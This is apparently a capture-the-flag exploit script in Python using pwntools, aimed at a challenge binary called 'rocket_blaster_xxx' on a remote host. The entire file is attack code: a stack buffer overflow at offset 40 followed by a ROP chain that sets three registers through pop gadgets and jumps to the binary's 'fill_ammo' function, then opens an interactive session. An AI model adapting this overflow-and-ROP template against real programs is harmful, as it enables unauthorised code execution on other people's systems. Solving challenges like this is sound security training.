#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '83.136.255.150', 38566

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    pop_rdi = 0x40159f
    pop_rsi = 0x40159d
    pop_rdx = 0x40159b

    offset = 40
    payload = flat({
        offset: [
            rop.ret.address,
            pop_rdi,
            0xdeadbeef,
            pop_rsi,
            0xdeadbabe,
            pop_rdx,
            0xdead1337,
            elf.sym['fill_ammo']
        ]
    })

    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()